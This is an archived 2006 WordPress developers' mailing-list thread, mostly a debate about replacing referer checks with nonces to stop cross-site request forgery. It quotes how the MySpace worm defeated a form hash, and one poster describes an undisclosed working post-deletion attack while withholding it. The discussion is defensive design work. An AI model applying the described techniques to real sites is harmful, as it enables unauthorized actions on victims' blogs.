> http://wordpress.org/support/topic/39204#post-310420
>
> Note that list is not for support. Support questions are best asked
> on the support forums, or on IRC.
>
> http://wordpress.org/support/
> http://codex.wordpress.org/IRC
>
> -Kaf
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From nuclearmoose at gmail.com  Wed Apr 19 02:05:40 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Apr 19 02:09:41 2006
Subject: [wp-hackers] Hacking the Archive List
In-Reply-To: <a0159cd30604181836i11c3003em20fd7858f34e0102@mail.gmail.com>
References: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>
	<44457C6C.1030208@szub.net>
	<a0159cd30604181836i11c3003em20fd7858f34e0102@mail.gmail.com>
Message-ID: <5aa3aa0604181905u7ff529c3h606ed3a2cd18d698@mail.gmail.com>

Support questions should be made at:
http://wordpress.org/support/
http://codex.wordpress.org/IRC

Craig.
From denis at semiologic.com  Wed Apr 19 02:18:42 2006
From: denis at semiologic.com (Denis de Bernardy)
Date: Wed Apr 19 02:22:51 2006
Subject: [wp-hackers] Hacking the Archive List
In-Reply-To: <a0159cd30604181836i11c3003em20fd7858f34e0102@mail.gmail.com>
Message-ID: <000001c66357$9677b550$2f01a8c0@kergan>

I don't recall every seeing a plugin that does that, but it's certainly
feasible.

D.

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Dave Grijalva
> Sent: Tuesday, April 18, 2006 6:37 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Hacking the Archive List
> 
> 
> I'm not looking for support.  I just wanna see if I've missed 
> something before I waste my time writing a plugin or hacking wp.
> 
> -dave
> 
> On 4/18/06, Kaf Oseo <kaf@szub.net> wrote:
> >
> > http://wordpress.org/support/topic/39204#post-310420
> >
> > Note that list is not for support. Support questions are 
> best asked on 
> > the support forums, or on IRC.
> >
> > http://wordpress.org/support/
> > http://codex.wordpress.org/IRC
> >
> > -Kaf
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com 
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com 
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 

From mark.wordpress at txfx.net  Wed Apr 19 02:45:17 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Apr 19 02:49:22 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4444E444.5060908@midnightcircus.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4444CAF1.3090302@midnightcircus.com>
	<679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>
	<4444E444.5060908@midnightcircus.com>
Message-ID: <3BC2CA2B-532D-4817-8881-D04E940F3753@txfx.net>

On Apr 18, 2006, at 9:06 AM, Owen Winkler wrote:

> Eh.  I'm still not crazy about the idea of having the individual  
> admin pages validate themselves by calling this checking function.   
> For one, it implies that there is someplace in the admin that  
> people should be able to go without a key, and I can't think of  
> anyplace like that.  For another, any place accidentally missing  
> the check becomes an instant vulnerability.

Missing the current referer check becomes an instant vulnerability.   
AFAIK we still have a few of these in 2.0.2 ... so that's nothing new.

And there are places that people should be able to go without a  
key... idempotent requests shouldn't require a key... as "tricking"  
someone into going there shouldn't **do** anything but show them that  
screen.  If it **does** do something, you're talking about <script>  
injection, which is a separate issue.

I'm just suggesting that a unique user-specific, action-specific and  
option-specific key be used to validate forms, instead of checking  
the HTTP referer, because it will be more user friendly, while not  
decreasing the level of security in any way.

> And finally, by adding it to a generic "in the admin" script, it  
> allows the keys to be used when accessing plugin option pages  
> without necessarily modifying any existing plugins.  (In the case  
> of options.php?page=X, by doing the verification in the options.php  
> page, which indirectly handles the inclusion of the plugin.)  It  
> will simply require plugin authors who want their option pages to  
> circumvent the "Are you sure?" messages to add the nonce generator  
> as part of their form submission.  Without the key, an "Are you  
> sure?" form should appear that when submitted forwards the request  
> on in the same manner as the original form, but with the  
> appropriate key.

I was thinking that it could fall back on the referer check for  
plugins that haven't been updated, but your idea sounds good too.   
Maybe they could be combined:

1) check key/nonce
2) if not provided, check HTTP referer
3) if HTTP referer isn't from the admin, present "are you sure" dialog

Of course, this would require that we remain vigilant about non- 
idempotent GET requests, lest we open ourselves to a vulnerability in  
the form of malicious links/images inside drafts or comments... but  
it would make the transition very smooth.

--
Mark Jaquith
http://txfx.net/


From m at mullenweg.com  Wed Apr 19 03:15:02 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 03:19:00 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.GSO.4.58.0604181759270.23255@clyde>
References: <444554BD.9010209@ftwr.co.uk>	<D0252C90757CBC4B8BC938A72BEDDF9DF98065@dsimail.drbsystems.com>	<a491f91d0604181630n7b43b531yd436fc6c2e1d1e40@mail.gmail.com>
	<Pine.GSO.4.58.0604181759270.23255@clyde>
Message-ID: <4445AB36.9020909@mullenweg.com>

Michael D. Adams wrote:
> Perhaps we already are, but let's get this thread back on track.  Mark
> wasn't discussing the security problems with the current scheme (which are
> not insurmountable [1]), but the convenience problems.

I have found that by deleting wp-config.php, all mentioned security 
problems are addressed.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From mark.wordpress at txfx.net  Wed Apr 19 03:21:38 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Wed Apr 19 03:25:38 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4445AB36.9020909@mullenweg.com>
References: <444554BD.9010209@ftwr.co.uk>	<D0252C90757CBC4B8BC938A72BEDDF9DF98065@dsimail.drbsystems.com>	<a491f91d0604181630n7b43b531yd436fc6c2e1d1e40@mail.gmail.com>
	<Pine.GSO.4.58.0604181759270.23255@clyde>
	<4445AB36.9020909@mullenweg.com>
Message-ID: <813A0DCB-18DA-40B2-A724-179CDB83243E@txfx.net>

On Apr 18, 2006, at 11:15 PM, Matt Mullenweg wrote:

> I have found that by deleting wp-config.php, all mentioned security  
> problems are addressed.

A little late on that one... that vulnerability (and fix) was posted  
on http://snotty-php-kidz.net/ two days ago.
--
Mark Jaquith
http://txfx.net/


From Brian at TheCodeCave.com  Wed Apr 19 03:24:31 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 19 03:28:26 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <813A0DCB-18DA-40B2-A724-179CDB83243E@txfx.net>
Message-ID: <000001c66360$c74f96d0$0664a8c0@tiger1>

Mark Jaquith spammed:
>A little late on that one... that vulnerability (and fix) was posted  
>on http://snotty-php-kidz.net/ two days ago.

HEY - I actually wasted 15 seconds of my life following that link....

From ryan at boren.nu  Wed Apr 19 03:32:17 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Apr 19 03:36:18 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <3BC2CA2B-532D-4817-8881-D04E940F3753@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4444CAF1.3090302@midnightcircus.com>	<679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>	<4444E444.5060908@midnightcircus.com>
	<3BC2CA2B-532D-4817-8881-D04E940F3753@txfx.net>
Message-ID: <4445AF41.3020207@boren.nu>

Mark Jaquith wrote:
> And there are places that people should be able to go without a  key... 
> idempotent requests shouldn't require a key... as "tricking"  someone 
> into going there shouldn't **do** anything but show them that  screen.  
> If it **does** do something, you're talking about <script>  injection, 
> which is a separate issue.

Maybe whitelist the idempotent actions and check referer for everything 
else.  Code like this perhaps:

$idempotent_actions = array('confirmdeletecomment', 
'mailapprovecomment', 'editcomment');
if ( ! in_array($action, $idempotent_actions) )
	check_admin_referer();

Using comment.php as an example, we'd do that check at the top of 
comment.php instead of having to remember to do the referer check for 
every non-idempotent action.

Ryan
From m at mullenweg.com  Wed Apr 19 03:38:35 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 03:42:32 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
Message-ID: <4445B0BB.7070602@mullenweg.com>

Mark Jaquith wrote:
> I'm still curious what Matt meant by this... it's the only thing 
> stopping me from writing the patch:

http://namb.la/popular/tech.html

#9:

"9) Finally we can do a POST! However, when we send the post it never 
actually adds a friend. Why not? Myspace generates a random hash on a 
pre-POST page (for example, the "Are you sure you want to add this user 
as a friend" page). If this hash is not passed along with the POST, the 
POST is not successful. To get around this, we mimic a browser and send 
a GET to the page right before adding the user, parse the source for the 
hash, then perform the POST while passing the hash."

This person has gotten JS onto the domain, which confirms the fact that 
our best efforts should be on the KSES side of things, because once 
someone has snuck any JS into our "trusted" area, all bets are off.

People who know JS far better than I have told me in the past it is 
possible to do cross-domain GETs so nonces are snake-oil, however my 
best Googling can not find anything. (Perhaps for the best!)

If the best an attacker can do is embed a link in a comment or email and 
hope you click on it, then we've succeeded. At some point we have to 
stop punishing normal users for the extreme edge cases.

The most valid point thus far has been about images in drafts, which I 
think is a place where we could improve check_admin_referer to block 
actions (like delete comment) that are never going to come from the post 
screen. This would not break any compatibility, and not cause any 
additional hassle for users.

I still think the best answer to the original problem is a plugin which 
just turns check_admin_referer off.

Here are two good security essays:

http://mpt.net.nz/archive/2006/02/20/certificates
http://www.schneier.com/crypto-gram-9902.html
(More about cryptography, but still interesting. From 1999.)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From kaf at szub.net  Wed Apr 19 03:51:56 2006
From: kaf at szub.net (Kaf Oseo)
Date: Wed Apr 19 03:55:52 2006
Subject: [wp-hackers] Hacking the Archive List
In-Reply-To: <a0159cd30604181836i11c3003em20fd7858f34e0102@mail.gmail.com>
References: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>	<44457C6C.1030208@szub.net>
	<a0159cd30604181836i11c3003em20fd7858f34e0102@mail.gmail.com>
Message-ID: <4445B3DC.8020503@szub.net>

Well, one is certainly free to wrap a plugin around my code I linked
to and release it. It's 'in the wild' as they say.

-Kaf

Dave Grijalva wrote:
> I'm not looking for support.  I just wanna see if I've missed something
> before I waste my time writing a plugin or hacking wp.
> 
> -dave

From sam at rephrase.net  Wed Apr 19 04:46:43 2006
From: sam at rephrase.net (Sam Angove)
Date: Wed Apr 19 04:50:48 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4445B0BB.7070602@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com>
Message-ID: <aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>

On 4/19/06, Matt Mullenweg <m@mullenweg.com> wrote:
>
> I still think the best answer to the original problem is a plugin which
> just turns check_admin_referer off.

The best answer is for them to remove their anti-CSRF security
completely? The solution is to get a better lock, not leave the door
open.

> People who know JS far better than I have told me in the past it is
> possible to do cross-domain GETs so nonces are snake-oil, however my
> best Googling can not find anything. (Perhaps for the best!)

I think the reason you can't find anything is because there's nothing
to find. A working exploit would be big news. Here's a relevant
Crypto-Gram article[1]. ;)

[1]: http://www.schneier.com/crypto-gram-0307.html#8

If you're genuinely worried, the referer check could be kept as well.
They're not mutually exclusive.

> If the best an attacker can do is embed a link in a comment or email and
> hope you click on it, then we've succeeded. At some point we have to
> stop punishing normal users for the extreme edge cases.

How are users being punished? The worst case for them should be the
occasional "are you sure you want to do this?" confirmation page,
which is *better* than the current "wrong referrer" die().
From Brian at TheCodeCave.com  Wed Apr 19 04:59:06 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 19 05:03:01 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604181630n7b43b531yd436fc6c2e1d1e40@mail.gmail.com>
Message-ID: <000301c6636d$fdc0e4a0$0664a8c0@tiger1>

>With KSES, this should be a non-issue.
In any case, no-one is ever gonna be able to make anything completely
secure. There will always be ways to get past security, the objective
should be to secure as many holes as is reasonably possible.

I'll sit back and let you all go at the meat of this for a while,
because a combination of logged in user, timed nonce, falling back on a
referer checks and finally falling back to a y/n verification IS the way
to go, IMHO.  But first I wanted to give you the results of my tests
tonight.  With a WP 2.02 blog, I was able to delete posts without any
indication to the administrator that it had happened. Using the same
method, I was able to delete all tracks I'd left behind.  

I can provide a link, privately, to the wp developers if you want to see
it.  You may already more ways than this to delete posts and so don't
need to see it.  That's fine too.  But, if you need a working example to
play with, I can provide you with a link.  I don't want to post it to
the list as it is fully functional - as is - and could be used to delete
posts from any WP blog.

The good news is that I was not able to do this through any image tags.
The main problem there was that the referer within the WYSIWYG editor
isn't wp-admin.  It's "wp-includes/.../tinymce/...".  The preview, as
mentioned before, has its own context as well.  I believe I could have
gotten the image portion to work from the Manage Comments view comment
page but I can't create a regex string worth a dime and that part of it
was beyond me.  However I suspect it is still possible.  A timed nonce
would make that much more difficult proposition.

I'll send the details to Matt in anycase, just so someone has it.

Brian

http://www.TheCodeCave.com

From m at mullenweg.com  Wed Apr 19 05:24:27 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 05:28:25 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>
	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>
Message-ID: <4445C98B.9040902@mullenweg.com>

Sam Angove wrote:
> The best answer is for them to remove their anti-CSRF security
> completely? The solution is to get a better lock, not leave the door
> open.

Yes. These aren't doors and locks. It's more like taking your shoes off 
at airport security. The chances of anyone having something bad in their 
shoes is infinitesimal, and it mostly serves to make people feel better.

If one person is allowed to walk through with their shoes on (as people 
were allowed to for years) the security of airport isn't compromised.

Important problems are ones that are easily scriptable into worms: SQL 
injection, arbitrary PHP code execution, site defacing, etc.

Our first and best line of defense is always going to be around how we 
filter and display submitted HTML. This can also be easily tightened up 
without compromising the user experience.

> I think the reason you can't find anything is because there's nothing
> to find. A working exploit would be big news. Here's a relevant
> Crypto-Gram article[1]. ;)

Just as Douglas Crockford deemphasized JSON for years because of the 
troubling security implications, many of the brightest minds in a given 
field are not interested in the "glory" of creating a fuss on bugtraq 
and their ilk.

> How are users being punished? The worst case for them should be the
> occasional "are you sure you want to do this?" confirmation page,
> which is *better* than the current "wrong referrer" die().

Are you sure you want an answer? [ OK ] [ Cancel ]

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From m at mullenweg.com  Wed Apr 19 05:25:40 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr 19 05:29:35 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <000001c66360$c74f96d0$0664a8c0@tiger1>
References: <000001c66360$c74f96d0$0664a8c0@tiger1>
Message-ID: <4445C9D4.8080107@mullenweg.com>

Brian Layman wrote:
> Mark Jaquith spammed:
>> A little late on that one... that vulnerability (and fix) was posted  
>> on http://snotty-php-kidz.net/ two days ago.
> 
> HEY - I actually wasted 15 seconds of my life following that link....

Good thing it wasn't a malicious link, it would have been a brilliant 
proof of concept. (I clicked it too.)

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From ryan at boren.nu  Wed Apr 19 05:40:00 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Apr 19 05:44:02 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4445C98B.9040902@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>
	<4445C98B.9040902@mullenweg.com>
Message-ID: <4445CD30.7030004@boren.nu>

Matt Mullenweg wrote:
> Our first and best line of defense is always going to be around how we 
> filter and display submitted HTML. This can also be easily tightened up 
> without compromising the user experience.

The sole benefit, as I see it, of a nonce/key is to avoid the user 
experience problems created by refer[r]er checks.  I certainly get tired 
of answering the, "Help, how do I enable sending referrers"  questions. 
   It is definitely a bar to entry for many.  Assuming equivalent 
"security", which method means less support overhead and better user 
experience?

Ryan
From sam at rephrase.net  Wed Apr 19 09:19:53 2006
From: sam at rephrase.net (Sam Angove)
Date: Wed Apr 19 09:23:53 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4445C98B.9040902@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com>
	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>
	<4445C98B.9040902@mullenweg.com>
Message-ID: <aa74b1910604190219t16ea6344gb47f43a7157650ed@mail.gmail.com>

On 4/19/06, Matt Mullenweg <m@mullenweg.com> wrote:
>
> Yes. These aren't doors and locks. It's more like taking your shoes off
> at airport security. The chances of anyone having something bad in their
> shoes is infinitesimal, and it mostly serves to make people feel better.

Well, it's the same with doors and locks: the chance that someone will
exploit my unlocked door is infinitesimal. Of course, I'll be the only
one affected if I'm robbed blind, so I can see why the door vendor
doesn't care either way. That doesn't make it good advice, and the
vendor deserves criticism for giving it.

The shoes are bad security because the tradeoff isn't worth it, but
better CSRF protection won't require users to queue for a half-hour
with bare feet.

>
> Are you sure you want an answer? [ OK ] [ Cancel ]

[ OK ]. Prompts are okay if they're not too frequent and they don't
cause data loss. I don't see why either would be a problem here,
except possibly with plugins.


>  many of the brightest minds in a given
> field are not interested in the "glory" of creating a fuss on bugtraq
> and their ilk.

I'd hope that these "brighest minds" weren't so criminally
irresponsible as to leave others in their field so ignorant that
they'd continue to advocate this method in books and articles on web
application security. Or, for that matter, that they'd fail to notify
the browser vendors, who should be able to fix any vulnerability of
this type fairly easily.
From elharo at metalab.unc.edu  Wed Apr 19 10:42:58 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 19 10:47:21 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <aa74b1910604190219t16ea6344gb47f43a7157650ed@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>	<4445C98B.9040902@mullenweg.com>
	<aa74b1910604190219t16ea6344gb47f43a7157650ed@mail.gmail.com>
Message-ID: <44461432.1090902@metalab.unc.edu>

Sam Angove wrote:

> Well, it's the same with doors and locks: the chance that someone will
> exploit my unlocked door is infinitesimal. 

Only because no one's yet built a robot to quickly scan all doors in the 
neighborhood to see which are unlocked. The problem's quite a bit more 
serious for WordPress. :-(

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Wed Apr 19 11:03:21 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Wed Apr 19 11:07:42 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4445B0BB.7070602@mullenweg.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>
	<4445B0BB.7070602@mullenweg.com>
Message-ID: <444618F9.9070000@metalab.unc.edu>

Matt Mullenweg wrote:

> If the best an attacker can do is embed a link in a comment or email and 
> hope you click on it, then we've succeeded. At some point we have to 
> stop punishing normal users for the extreme edge cases.


No, If that's possible, you've made a classic mistake. Clicking the link 
should not take any action. That's the difference between GET and POST:

http://cafe.elharo.com/web/rest-mistake-1-confirming-gets/

It's easy to fix. You just need to make sure that all actions take place 
through POST, not GET, regardless of URL. This wouldn't punish anybody.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From dmhouse at gmail.com  Wed Apr 19 11:12:45 2006
From: dmhouse at gmail.com (David House)
Date: Wed Apr 19 11:16:43 2006
Subject: [wp-hackers] Hacking the Archive List
In-Reply-To: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>
References: <a0159cd30604181642k48b723feg1293156369bb75af@mail.gmail.com>
Message-ID: <ebe43d680604190412g5f6d8f9ejadf86758314a471b@mail.gmail.com>

On 19/04/06, Dave Grijalva <grijalva@gmail.com> wrote:
> The longer I've been blogging, the more space is wasted in my archive list.
> What I'd really like to have is a link to every year before the previous and
> a link to every month in the current year.  Does anybody know if this is
> possible without hacking the wp source? Here's an example of what I'm
> looking for

Two calls to wp_get_archives() should do you.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From ringmaster at midnightcircus.com  Wed Apr 19 13:18:45 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr 19 13:18:27 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4445CD30.7030004@boren.nu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4445B0BB.7070602@mullenweg.com>	<aa74b1910604182146k27c084eg798cd5619857abd9@mail.gmail.com>	<4445C98B.9040902@mullenweg.com>
	<4445CD30.7030004@boren.nu>
Message-ID: <444638B5.6040908@midnightcircus.com>

Ryan Boren wrote:
> Matt Mullenweg wrote:
>> Our first and best line of defense is always going to be around how we 
>> filter and display submitted HTML. This can also be easily tightened 
>> up without compromising the user experience.
> 
> The sole benefit, as I see it, of a nonce/key is to avoid the user 
> experience problems created by refer[r]er checks.  I certainly get tired 
> of answering the, "Help, how do I enable sending referrers"  questions. 
>   It is definitely a bar to entry for many.  Assuming equivalent 
> "security", which method means less support overhead and better user 
> experience?

Yes, the current message when the referer check fails is very ugly.  Can 
we get away with only replacing this message with a confirmation?  Is 
that possible?

If that's the case then clicking on nearly any link in the admin from a 
browser that doesn't provide a referer will produce that confirmation 
message.  I suppose being able to click through confirmations on every 
other page is more functional than the current die().

Or, we can replace the whole mess with nonces, which will work similarly 
to the referer checks for browsers that supported that, and will allow 
non-supporting browsers to skip over those confirmations (or see only 
one, instead of one for every admin page view).  If done well, it can 
also add a bit more security than the current referer check provides, 
since it will verify based on the intended action, not just whether the 
last page viewed was an admin page.

In terms of decreasing required support and improving user experience, 
nonces are the way to go.  They remove the entire issue of explaining 
why it might not be possible to enable referers in browsers that don't 
support it or are behind a proxy or firewall.

Owen


From ringmaster at midnightcircus.com  Wed Apr 19 13:33:17 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr 19 13:32:56 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <3BC2CA2B-532D-4817-8881-D04E940F3753@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>	<4444AB62.8070807@paul-mitchell.me.uk>	<E56BF83F-E137-4870-864E-B30A3AC59F19@txfx.net>	<4444CAF1.3090302@midnightcircus.com>	<679AA336-B13E-4E9A-B85C-581A48FCBE30@txfx.net>	<4444E444.5060908@midnightcircus.com>
	<3BC2CA2B-532D-4817-8881-D04E940F3753@txfx.net>
Message-ID: <44463C1D.1040205@midnightcircus.com>

Mark Jaquith wrote:
> And there are places that people should be able to go without a key... 
> idempotent requests shouldn't require a key... as "tricking" someone 
> into going there shouldn't **do** anything but show them that screen.  
> If it **does** do something, you're talking about <script> injection, 
> which is a separate issue.

I thought of that soon after I wrote the last message, but hadn't come 
up with a good solution for it that still jived with the global checking 
I was suggesting.

> I was thinking that it could fall back on the referer check for plugins 
> that haven't been updated, but your idea sounds good too.  Maybe they 
> could be combined:
> 
> 1) check key/nonce
> 2) if not provided, check HTTP referer
> 3) if HTTP referer isn't from the admin, present "are you sure" dialog

Yeah, this sounds good.  ;)

Owen


From korey99 at yahoo.com  Wed Apr 19 14:58:52 2006
From: korey99 at yahoo.com (Korey Atterberry)
Date: Wed Apr 19 15:02:56 2006
Subject: [wp-hackers] Filter hook to selectively show comments for a post
In-Reply-To: <44453DA9.2030001@paul-mitchell.me.uk>
Message-ID: <20060419145852.85402.qmail@web33611.mail.mud.yahoo.com>

Ok, thanks for the confirmation, Paul.  I'll try that approach.  I
could probably get by asking my users to add just one line to their
comment template.

Korey

--- Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:

> The WP comment template code
> (wp-includes/comment-functions.php/comments_template) doesn't offer
> any
> way for a plugin to filter the comments. Some participation from the
> theme is necessary.

From Brian at TheCodeCave.com  Wed Apr 19 15:12:00 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Wed Apr 19 15:16:13 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44463C1D.1040205@midnightcircus.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9806B@dsimail.drbsystems.com>

Mark Jaquith wrote:
> 3) if HTTP referer isn't from the admin, present "are you sure" dialog
